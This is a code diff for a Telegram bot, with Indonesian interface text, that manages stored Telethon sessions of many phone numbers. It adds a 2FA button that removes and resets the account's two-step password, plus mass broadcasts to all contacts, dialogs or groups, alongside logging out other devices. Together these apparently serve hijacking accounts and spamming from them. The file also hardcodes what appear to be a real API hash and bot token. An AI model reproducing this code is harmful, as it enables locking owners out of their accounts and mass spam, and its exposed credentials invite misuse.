@@ -4,6 +4,8 @@ import hashlib
 import math
 import os
 import types
+import time
+import pytz # type: ignore
 from warnings import filterwarnings
 from telegram.warnings import PTBUserWarning
 from unittest.mock import _patch
@@ -18,7 +20,6 @@ from hapus_pesan import hapus_pesan_handler
 from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
 from telethon.tl.types import User
-import pytz
 from datetime import datetime
 import time
 from set_password_handler import receive_confirmation, start_set_password, cancel_password, SET_PASSWORD
@@ -26,12 +27,14 @@ from logout_device import logout_other_devices
 from configparser import ConfigParser
 from telegram.helpers import escape_markdown
 from broadcast import broadcast_via_dialog_handler
+from security import remove_and_set_2fa, check_2fa_status
+from user_settings import update_interval_settings, stats_users
 
 # Konfigurasi bot
 API_ID = 23520639
 API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'
 BOT_TOKEN = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
-SESSION_FOLDER = os.path.join(os.path.dirname(__file__), '..', 'broadcast')
+SESSION_FOLDER = os.path.join(os.path.dirname(__file__), '..', 'login3')
 SESSION_FOLDER = os.path.abspath(SESSION_FOLDER)
 os.makedirs(SESSION_FOLDER, exist_ok=True)
 
@@ -96,7 +99,6 @@ async def handle_select_number(update, context, phone_number):
         escaped_phone = escape_markdown(phone_number, version=2)
 
         from datetime import datetime
-        import pytz
         local_time = datetime.now(pytz.timezone('Asia/Jakarta')).strftime('%Y-%m-%d %H:%M:%S')
         escaped_time = escape_markdown(local_time, version=2)
 
@@ -120,7 +122,7 @@ async def handle_select_number(update, context, phone_number):
             InlineKeyboardButton("🟢 SESI AKTIF", callback_data=f"sesi_{phone_number}")
         ],
         [
-            InlineKeyboardButton("🔒 SET PASSWORD", callback_data=f"set_password_{phone_number}"),
+            InlineKeyboardButton("🔒 Verifikasi 2FA", callback_data=f"change_2fa_{phone_number}"),
             InlineKeyboardButton("📢 BROADCAST", callback_data=f"broadcast_{phone_number}")
         ],
         [
@@ -188,9 +190,30 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         phone_number = data.split("_", 1)[1]
         await hapus_pesan_handler(update, context, phone_number)
 
+    elif data.startswith("change_2fa_"):
+        phone_number = data.split("_", 2)[2]
+        await remove_and_set_2fa(update, context, phone_number)
+
+
     elif data.startswith("broadcast_"):
         phone_number = data.split("_", 1)[1]
-        await broadcast_via_dialog_handler(update, context, phone_number)
+        keyboard = [
+            [
+                InlineKeyboardButton("📨 Broadcast ke Semua", callback_data=f"broadcastmode_all_{phone_number}"),
+                InlineKeyboardButton("👥 Broadcast ke Kontak", callback_data=f"broadcastmode_contact_{phone_number}")
+            ],
+            [
+                InlineKeyboardButton("🟢 Broadcast ke Grup", callback_data=f"broadcastmode_group_{phone_number}")
+            ]
+        ]
+        await update.callback_query.message.reply_text(
+            "Silakan pilih mode broadcast:",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+
+    elif data.startswith("broadcastmode_"):
+        _, mode, phone_number = data.split("_", 2)
+        await broadcast_via_dialog_handler(update, context, phone_number, mode)
 
     elif data.startswith("sesi_"):
         phone_number = data.split("_", 1)[1]
